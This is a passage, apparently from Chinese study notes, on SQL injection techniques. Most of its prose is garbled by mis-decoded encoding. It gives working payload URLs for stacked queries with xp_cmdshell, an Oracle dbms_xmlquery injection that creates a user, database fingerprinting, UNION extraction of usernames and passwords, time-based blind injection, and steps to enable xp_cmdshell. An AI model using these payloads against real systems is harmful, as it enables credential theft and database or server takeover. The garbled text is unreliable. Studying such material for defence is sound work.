æŸ¥è¯¢ï¼Œä½†å¦‚æœä½¿ç”¨Javaæ¥è®¿é—®ï¼Œå°±ä¸å…è®¸ã€‚ä½¿ç”¨PHPè®¿é—®PostgreSQLæ—¶ï¼Œ PHPå…è®¸å †å æŸ¥è¯¢ï¼Œä½†å¦‚æœè®¿é—®MySQL, PHPä¸å…è®¸å †å æŸ¥è¯¢ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp=id=l;exec+master..xp_cmdshell+'dir'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="åœ¨Webåº”ç”¨ç¨‹åºä¸­åˆ©ç”¨Oracleæ¼æ´"><a href="#åœ¨Webåº”ç”¨ç¨‹åºä¸­åˆ©ç”¨Oracleæ¼æ´" class="headerlink" title="åœ¨Webåº”ç”¨ç¨‹åºä¸­åˆ©ç”¨Oracleæ¼æ´"></a>åœ¨Webåº”ç”¨ç¨‹åºä¸­åˆ©ç”¨Oracleæ¼æ´</h4><p>Oracle SQLè¯­æ³•ä¸æ”¯æŒå †å æŸ¥è¯¢ï¼ŒPL/SQLæ˜¯å†…ç½®åœ¨Oracleä¸­çš„ï¼Œå®ƒæ‹“å±•äº†SQLå¹¶å…è®¸æ‰§è¡Œå †å çš„å‘½ä»¤ï¼Œä½¿ç”¨ä¸€ä¸ªåŒ¿åPL/SQLå—ï¼Œå®ƒåŒ…å«åœ¨ä¸€æ¡BEGINè¯­å¥ä¸ä¸€æ¡ENDè¯­å¥ä¹‹é—´ï¼Œæ˜¯ä¸€ä¸ªè‡ªç”±ç¼–å†™çš„PL/SQLå—ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SQL</span><span class="token operator">&gt;</span><span class="token keyword">DECLARE</span>MESG VARCHAR2 <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span>MESG:<span class="token operator">=</span><span class="token string">'HELLO WORLD'</span><span class="token punctuation">;</span>DBMS_OUTPUT<span class="token punctuation">.</span>PUT_LINE<span class="token punctuation">(</span>MESG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Oracleé»˜è®¤å®‰è£…äº†ä¸¤ä¸ªå…è®¸æ‰§è¡ŒåŒ¿åPL/SQLå—çš„å‡½æ•°</p><p><code>dbms_xmlquery.newcontext()</code> <code>dbms_xmlquery.getxml()</code></p><p>publicç”¨æˆ·é»˜è®¤å…è®¸è®¿é—®è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ¥æ‰§è¡ŒDML/DDLè¯­å¥å—ï¼Œå½¢æˆSQLæ³¨å…¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUT0N0M0US_TRANSACTI0N; begin execute immediate '' create user pwned identified by pwn3d ''; commit; end;') from dual) is not null -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è¯†åˆ«æ•°æ®åº“"><a href="#è¯†åˆ«æ•°æ®åº“" class="headerlink" title="è¯†åˆ«æ•°æ®åº“"></a>è¯†åˆ«æ•°æ®åº“</h3><p>ASPå’Œ.NETé€šå¸¸ä½¿ç”¨Microsoft SQL Server ä½œä¸ºåå°æ•°æ®åº“ï¼Œè€ŒPHPåº”ç”¨åˆ™å¾ˆå¯èƒ½ä½¿ç”¨MySQLæˆ–PostgreSQLã€‚å¦‚æœåº”ç”¨æ˜¯ç”¨Javaç¼–å†™çš„ï¼Œé‚£ä¹ˆä½¿ç”¨çš„å¯èƒ½æ˜¯Oracleæˆ–MySQLã€‚æ­¤å¤–ï¼Œåº•å±‚æ“ä½œç³»ç»Ÿä¹Ÿå¯ä»¥æä¾›ä¸€äº›çº¿ç´¢ï¼šå®‰è£… IISï¼ˆIntemetä¿¡æ¯æœåŠ¡å™¨ï¼‰ä½œä¸ºæœåŠ¡å™¨å¹³å°æ ‡å¿—ç€åº”ç”¨æ˜¯åŸºäºWindowsçš„æ¶æ„ï¼Œåå°æ•°æ®åº“å¾ˆå¯èƒ½æ˜¯SQLServerã€‚è€Œè¿è¡ŒApacheå’ŒPHPçš„LinuxæœåŠ¡å™¨åˆ™å¾ˆå¯èƒ½ä½¿ç”¨çš„æ˜¯å¼€æºæ•°æ®åº“ï¼Œæ¯”å¦‚ MySQLæˆ–PostgreSQLã€‚</p><h4 id="éç›²è·Ÿè¸ª"><a href="#éç›²è·Ÿè¸ª" class="headerlink" title="éç›²è·Ÿè¸ª"></a>éç›²è·Ÿè¸ª</h4><p>æŸ¥è¯¢ä½¿ç”¨çš„æ•°æ®åº“æœåŠ¡å™¨æŠ€æœ¯ä¸åŒï¼Œè¿™æ¡SQLäº§ç”Ÿçš„é”™è¯¯ä¹Ÿä¼šä¸åŒï¼Œå¯ä»¥æ ¹æ®è¿™äº›ä¸åŒåˆ¤æ–­å‡ºæ•°æ®åº“ç±»å‹ã€‚</p><p>ä¸‹é¢æ˜¯å¸¸è§çš„æŠ¥é”™</p><ul><li><p>mssql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span><span class="token punctuation">[</span>Microsof<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span>Unclosed quotation mark <span class="token keyword">after</span> the <span class="token keyword">character</span>string"<span class="token punctuation">.</span><span class="token operator">/</span>products<span class="token punctuation">.</span>asp<span class="token punctuation">,</span>line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>mysql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span> : You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span>near<span class="token string">' '</span>at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>oracle</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ORA<span class="token operator">-</span><span class="token number">01773</span>:may <span class="token operator">not</span> specify <span class="token keyword">column</span> datatypes <span class="token operator">in</span> this <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>postgreSQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_query<span class="token punctuation">(</span><span class="token punctuation">)</span>: Query failed: ERROR: unterminated quoted string at <span class="token operator">or</span> near at <span class="token keyword">character</span> <span class="token number">69</span> <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>php<span class="token operator">/</span>somepge<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h5 id="è·å–æ ‡å¿—ä¿¡æ¯"><a href="#è·å–æ ‡å¿—ä¿¡æ¯" class="headerlink" title="è·å–æ ‡å¿—ä¿¡æ¯"></a>è·å–æ ‡å¿—ä¿¡æ¯</h5><table><thead><tr><th>æ•°æ®åº“æœåŠ¡å™¨</th><th>æŸ¥è¯¢</th></tr></thead><tbody><tr><td>MSSQL</td><td>select @@version</td></tr><tr><td>Mysql</td><td>select version()  <br>select @@version</td></tr><tr><td>Oralce</td><td>select banner from v$version<br>select banner from v$version where rownum=1</td></tr><tr><td>PostgreSQL</td><td>select version()</td></tr></tbody></table><ul><li>mssql</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=@@version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•°æ®åº“å°†ä¼ å…¥çš„@@versionå½“åšæ•°å­—å‹è§£æäº§ç”ŸæŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span>Conversion failed <span class="token keyword">when</span> converting thenvarchar <span class="token keyword">value</span> <span class="token string">'Microsoft SQL Server 2005-9.00.3042.00 (Intel X86) Feb 9 2007 22:47:07 Copyright (c) 1988-2005 Microsoft Corporation Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)'</span><span class="token keyword">to</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token operator">/</span>products<span class="token punctuation">.</span>asp<span class="token punctuation">.</span>line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ®µé”™è¯¯ä»£ç è¡¨æ˜äº†æ•°æ®åº“ä¸ºSQL Server 2005ï¼Œè¡¥ä¸Service Pack 2</p><ul><li>PostgreSQL</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">PostgreSQL <span class="token number">9.1</span><span class="token number">.1</span> <span class="token keyword">on</span> i686<span class="token operator">-</span>pc<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token punctuation">,</span> compiled <span class="token keyword">by</span> i686<span class="token operator">-</span>pc<span class="token operator">-</span>linuxgnu<span class="token operator">-</span> gcc <span class="token punctuation">(</span>Gentoo Hardened <span class="token number">4.4</span><span class="token number">.5</span> pl<span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">,</span> pie<span class="token operator">-</span><span class="token number">0.4</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token operator">-</span><span class="token keyword">bit</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒæ ·è¿”å›äº†å¾ˆå¤šåº•å±‚çš„ä¿¡æ¯</p><p>ä½¿ç”¨å…·æœ‰æ ‡å¿—æ€§çš„å­—ç¬¦ä¸²æˆ–è€…è¯­å¥æ³¨å…¥ï¼Œåœ¨è¿”å›ç»“æœï¼ˆæŠ¥é”™ç»“æœï¼‰ä¸­å¯»æ‰¾æ”¹å­—ç¬¦ä¸²æˆ–è€…è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œè¿™å„¿å°±å¯ä»¥ä½œä¸ºæ³¨å…¥ç‚¹ã€‚</p><p>SQL Serverå†…ç½®å˜é‡</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">@<span class="token variable">@version</span>:æ•°æ®åº“æœåŠ¡å™¨ç‰ˆæœ¬ã€‚@<span class="token variable">@servemame</span>:å®‰è£…<span class="token keyword">SQL</span> Serverçš„æœåŠ¡å™¨åç§°ã€‚@<span class="token variable">@language</span>ï¼šå½“å‰æ‰€ä½¿ç”¨è¯­è¨€çš„åç§°ã€‚@<span class="token variable">@spid</span>ï¼šå½“å‰ç”¨æˆ·çš„è¿›ç¨‹IDã€‚å¯ä»¥ä½¿ç”¨ä¸‹åˆ—æŸ¥è¯¢è·å–è¯¦ç»†çš„ç‰ˆæœ¬ä¿¡æ¯ï¼š<span class="token keyword">SELECT</span> SERVERPROPERTYCproductversionâ€™<span class="token punctuation">)</span>ï¼šä¾‹å¦‚<span class="token number">100.1600</span><span class="token number">.22</span>ã€‚ <span class="token keyword">SELECT</span> SERVERPROPERTY<span class="token punctuation">(</span><span class="token string">'productlevel'</span><span class="token punctuation">)</span>:ä¾‹å¦‚ RTMã€‚<span class="token keyword">SELECT</span> SERVERPROPERTY<span class="token punctuation">(</span><span class="token string">'edition'</span><span class="token punctuation">)</span>:ä¾‹å¦‚ Enterpriseã€‚<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>msverï¼šæ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¤„ç†å™¨æ•°é‡ã€å¤„ç†å™¨ç±»å‹ã€ç‰©ç†å†…å­˜ç­‰ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ç›²è¿½è¸ª"><a href="#ç›²è¿½è¸ª" class="headerlink" title="ç›²è¿½è¸ª"></a>ç›²è¿½è¸ª</h4><p>åº”ç”¨ä¸ä¼šè¿”å›ä¿¡æ¯æ—¶ï¼Œåˆ©ç”¨ä¸åŒæ•°æ®åº“ä½¿ç”¨SQLè¯­æ³•ä¸åŒäº§ç”Ÿçš„å·®å¼‚æ¥åˆ¤æ–­æ•°æ®åº“ç±»å‹ã€‚</p><h5 id="è¿æ¥å­—ç¬¦ä¸²çš„æ–¹å¼"><a href="#è¿æ¥å­—ç¬¦ä¸²çš„æ–¹å¼" class="headerlink" title="è¿æ¥å­—ç¬¦ä¸²çš„æ–¹å¼"></a>è¿æ¥å­—ç¬¦ä¸²çš„æ–¹å¼</h5><p>ç”¨ä¸åŒçš„æ”¯ä»˜ä¸²è¿æ¥æ–¹å¼æ³¨å…¥ï¼Œé€šè¿‡åŸå§‹è¯·æ±‚è¿”å›ç»“æœå¯¹æ¯”ï¼Œè‹¥ç›¸åŒï¼Œåˆ™ä¸ºå¯¹åº”æ•°æ®åº“ã€‚</p><p><img src="https://z3.ax1x.com/2021/07/19/WJRXsf.png" alt="WJRXsf.png"></p><h5 id="æ•°å­—å‡½æ•°"><a href="#æ•°å­—å‡½æ•°" class="headerlink" title="æ•°å­—å‡½æ•°"></a>æ•°å­—å‡½æ•°</h5><p>ç›¸å½“äºä¸åŒæ•°æ®åº“çš„ç‰¹å¾å€¼ï¼ŒåŸç†å’Œå‰é¢ç›¸ä¼¼</p><p><img src="https://z3.ax1x.com/2021/07/19/WJWkQ0.png" alt="WJWkQ0.png"></p><p>ä¾‹å¦‚ï¼ŒæˆåŠŸæ³¨å…¥<code>WAITEOR DELAY</code>ï¼Œè¡¨æ˜æ•°æ®åº“æ˜¯mssqlï¼ŒæˆåŠŸæ³¨å…¥<code>select pg_sleep(10)</code>ï¼Œè¡¨æ˜æ•°æ®åº“æ˜¯PostgreSQL</p><p>Mysqlç²¾ç¡®ç¡®å®šç‰ˆæœ¬</p><p><code>/* !ç‰ˆæœ¬å· è¯­å¥*/</code>è‹¥æ•°æ®åº“ç‰ˆæœ¬å·é«˜äºæˆ–ç­‰äºï¼åé¢çš„ï¼Œå°±ä¼šæ‰§è¡Œè¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span> <span class="token comment">/* !40119 + 1*/</span><span class="token comment">-- 2ï¼ˆå¦‚æœMySQLç‰ˆæœ¬ä¸º4.01.19æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰</span><span class="token comment">-- 1ï¼ˆå…¶ä»–æƒ…å†µï¼‰</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ä½¿ç”¨UNIONè¯­å¥æå–æ•°æ®"><a href="#ä½¿ç”¨UNIONè¯­å¥æå–æ•°æ®" class="headerlink" title="ä½¿ç”¨UNIONè¯­å¥æå–æ•°æ®"></a>ä½¿ç”¨UNIONè¯­å¥æå–æ•°æ®</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">column</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span>N <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token operator">-</span><span class="token number">1</span><span class="token keyword">UNION</span><span class="token keyword">SELECT</span> <span class="token keyword">column</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span>N <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token operator">-</span><span class="token number">2</span><span class="token comment">-- å»é™¤é‡å¤å€¼</span><span class="token keyword">UNION</span> <span class="token keyword">ALL</span><span class="token comment">-- é‡å¤çš„ä¹Ÿæ˜¾ç¤º</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å›æœ‰è¿™ä¸¤å¼ è¡¨æˆ–è€…ä¸¤ä¸ªæŸ¥è¯¢å¾—åˆ°çš„æ•°æ®</p><h4 id="åŒ¹é…åˆ—"><a href="#åŒ¹é…åˆ—" class="headerlink" title="åŒ¹é…åˆ—"></a>åŒ¹é…åˆ—</h4><p>æ»¡è¶³è¦æ±‚</p><ul><li>ä¸¤ä¸ªæŸ¥è¯¢çš„åˆ—æ•°å¿…é¡»ç›¸åŒ</li><li>ä¸¤ä¸ªselectå¯¹åº”åˆ—è¿”å›çš„æ•°æ®ç±»å‹æ˜¯å…¼å®¹çš„</li></ul><p>å¦‚æœæ— æ³•æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶å°±ä¼šæŸ¥è¯¢å¤±è´¥å¹¶è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œä¸‹é¢æ˜¯ä¸€äº›æ•°æ®åº“è¿”å›çš„é”™è¯¯</p><p><img src="https://z3.ax1x.com/2021/07/19/WJWmo4.png" alt="WJWmo4.png"></p><p>è¦å¾—åˆ°æ­£ç¡®çš„åˆ—æ•°ï¼Œä¸¤ç§æ–¹æ³•</p><ul><li><p>æ¯æ¬¡å¢åŠ åˆ—æ•°ï¼Œä¸æ–­å°è¯•</p><p>NULLå€¼ä¼šè½¬åŒ–ä¸ºå…¶ä»–ä»»ä½•æ•°æ®ç±»å‹ï¼Œè¿™æ ·èƒ½é¿å…å› æ•°æ®ç±»å‹ä¸åŒè€Œäº§ç”Ÿé”™è¯¯ã€‚</p><p>mysql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+null-- </span>http:<span class="token comment">//test/?id=12+union+select+null,null-- </span>http:<span class="token comment">//test/?id=12+union+select+null,null,null-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>oracleè¦æ±‚æ¯ä¸ªselectå¿…é¡»å¸¦fromï¼Œä½¿ç”¨dualï¼ˆæ‰€ç”¨ç”¨æˆ·éƒ½èƒ½è®¿é—®ï¼‰è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+null+from+dual-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ä½¿ç”¨order byå­—å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=12+order+by+1</span>http:<span class="token comment">//sql/Less-2/?id=12+order+by+2</span>http:<span class="token comment">//sql/Less-2/?id=12+order+by+3</span><span class="token comment">-- etc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è‹¥3æŠ¥é”™äº†ï¼Œ2æœªæŠ¥é”™ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸¤åˆ—</p><p>ç›¸å¯¹ä¸‹ï¼Œç¬¬äºŒç§æ›´ä¼˜ï¼Œå¯ä»¥ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾</p></li></ul><h4 id="åŒ¹é…æ•°æ®ç±»å‹"><a href="#åŒ¹é…æ•°æ®ç±»å‹" class="headerlink" title="åŒ¹é…æ•°æ®ç±»å‹"></a>åŒ¹é…æ•°æ®ç±»å‹</h4><p>å‡è®¾éœ€è¦æŸ¥è¯¢ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ï¼Œåˆ©ç”¨ä¸€ä¸ªæ”¯ä»˜ä¸²å€¼ä¸€ä¸ªä¸€ä¸ªä¾æ¬¡æ›¿æ¢NULLå€¼ï¼Œåªè¦ä¸æŠ¥é”™ï¼Œå°±èƒ½ç¡®å®šä½ç½®ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+' test',NULL,NULL,NULL </span>http:<span class="token comment">//test/?id=12+union+select+NULL,'test',NULL,NULL </span>http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,'test',NULL </span>http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,NULL,'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰äº›æ•°æ®åº“ä¸èƒ½ä½¿ç”¨NULLï¼Œåªèƒ½æš´åŠ›ç ´è§£ï¼Œä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·</p><p>å‡è®¾æœ€åä¸€ä¸ªä½ç½®æ˜¯å­—ç¬¦ä¸²å€¼ï¼Œä¾¿å¯ä»¥å¼€å§‹æ£€ç´¢æƒ³è¦è·å¾—çš„å€¼</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+NULL,version(),NULL,NULL</span><span class="token comment">-- è·å–ç‰ˆæœ¬</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥è¿æ¥å¤šæ¡è¯­å¥è¿”å›å¤šæ¡ä¿¡æ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+NULL,concat(version(),0x7e,database()),NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæƒ³è¦æ£€ç´¢çš„ä¸æ˜¯å­—ç¬¦ä¸²å­—ï¼Œå´åªæœ‰æ”¯ä»˜ä¸²å€¼çš„å­—æ®µï¼Œå¯ä»¥ä½¿ç”¨å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><p><img src="https://z3.ax1x.com/2021/07/19/WJWD6P.png" alt="WJWD6P.png"></p><p>PostgreSQLå…è®¸ä½¿ç”¨<code>||</code>è¿æ¥å­—ç¬¦ä¸²ï¼Œåªè¦æœ‰ä¸€ä¸ªå˜é‡æ˜¯å­—ç¬¦ä¸²å³å¯ä½œä¸ºå­—ç¬¦ä¸²å€¼</p><h4 id="åªè¿”å›ä¸€æ¡ç»“æœ"><a href="#åªè¿”å›ä¸€æ¡ç»“æœ" class="headerlink" title="åªè¿”å›ä¸€æ¡ç»“æœ"></a>åªè¿”å›ä¸€æ¡ç»“æœ</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=12 union select NULL,username,password from users</span><span class="token comment">-- æ­£å¸¸æ¥è¯´è¿™æ¡è¯­å¥å¯ä»¥è¿”å›è¡¨ä¸­æ‰€æœ‰æ•°æ®ï¼Œä½†æ˜¯æœ‰æ—¶åªä¼šè¿”å›ä¸€æ¡æ•°æ®</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=1 and 1=0 union select NULL,username,password from users</span><span class="token comment">-- å°†å‰é¢çš„æŸ¥è¯¢æ‹¼å‡‘æˆæ°¸å‡å¼ï¼Œå°†è¿”å›åé¢çš„ç¬¬ä¸€ä¸ªç»“æœ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=0 union select NULL,username,password from users limit 1,1 -- </span><span class="token comment">-- åŠ ä¸€ä¸ªé™åˆ¶æ¡ä»¶è¿”å›ç¬¬äºŒæ¡æ•°æ®ï¼Œwhereä¹Ÿè¡Œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ä½¿ç”¨æ¡ä»¶è¯­å¥"><a href="#ä½¿ç”¨æ¡ä»¶è¯­å¥" class="headerlink" title="ä½¿ç”¨æ¡ä»¶è¯­å¥"></a>ä½¿ç”¨æ¡ä»¶è¯­å¥</h3><p>æ„å»ºæ¡ä»¶è¯­å¥ï¼Œæ¡ä»¶è¯­å¥çš„æ‰§è¡Œç»“æœå¼ºè¿«æœåŠ¡å™¨è¿”å›ä¸åŒçš„ç»“æœï¼Œç”±ç»“æœçš„çŠ¶æ€æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸ</p><p><img src="https://z3.ax1x.com/2021/07/19/WJW560.png" alt="WJW560.png"></p><h4 id="åŸºäºæ—¶é—´"><a href="#åŸºäºæ—¶é—´" class="headerlink" title="åŸºäºæ—¶é—´"></a>åŸºäºæ—¶é—´</h4><p>åŸºäºWebåº”ç”¨å“åº”æ—¶é—´ä¸Šçš„å·®å¼‚ï¼Œè¯¥æ—¶é—´å–å†³äºæŸäº›ä¿¡æ¯çš„å€¼ã€‚</p><h5 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">;</span>Microsoft <span class="token keyword">SQL</span> Server <span class="token number">2005</span> <span class="token operator">-</span> <span class="token number">9.00</span><span class="token number">.3042</span><span class="token number">.00</span> <span class="token punctuation">(</span>Intel X86<span class="token punctuation">)</span>Feb <span class="token number">9</span> <span class="token number">2007</span> <span class="token number">22</span>:<span class="token number">47</span>:<span class="token number">07</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1988</span><span class="token operator">-</span><span class="token number">2005</span> Microsoft Corporation Standard Edition <span class="token keyword">on</span> Windows NT <span class="token number">5.2</span> <span class="token punctuation">(</span>Build <span class="token number">3790</span>: Service Pack <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12;if+(system_user='sa')+WAITFOR+DELAY+'0:0:5'-- </span><span class="token comment">-- è‹¥system_userç”¨æˆ·æ˜¯ç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·'sa',åˆ™ä¼šæ‰§è¡Œåé¢çš„waitfor delayå‡½æ•°ï¼Œé¡µé¢å»¶è¿Ÿ5s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:5'</span><span class="token comment">-- </span><span class="token comment">-- æˆªå–@@versionçš„ç¬¬25ä¸ªå­—ç¬¦æ˜¯å¦ä¸º5ï¼Œä¸º5å°±æ˜¯2005æ•°æ®åº“ï¼Œå¹¶ä¸”å»¶è¿Ÿè¿”å›</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è·‘ä¸ªè„šæœ¬èƒ½æŠŠè¿™ä¸€æ•´æ®µè·‘å‡ºæ¥ï¼Œç²¾ç¡®åˆ¤æ–­ï¼Œåˆ¤æ–­è¡¥ä¸ï¼Œåˆ©ç”¨è¡¥ä¸æ”»å‡»</p><p><img src="https://z3.ax1x.com/2021/07/19/WJWqk4.png" alt="WJWqk4.png"></p><p><a href="https://www.sqlteam.com/articles/sql-server-versions">SQL Server Version - SQLTeam.com</a></p><p>å¦‚æœæœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥ä½¿ç”¨xp_cmdshellæ‰©å±•å‚¨å­˜è¿‡ç¨‹æ¥äº§ç”Ÿå»¶è¿Ÿï¼Œå®ƒé€šè¿‡åŠ è½½ä¸€æ¡éœ€è¦èŠ±è´¹ç‰¹å®šç§’æ•°çš„å‘½ä»¤æ¥å®ç°ã€‚</p><p>å¯ç”¨xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- sql server 2005 2008</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>GO<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell*'</span><span class="token punctuation">,</span><span class="token number">1</span><span 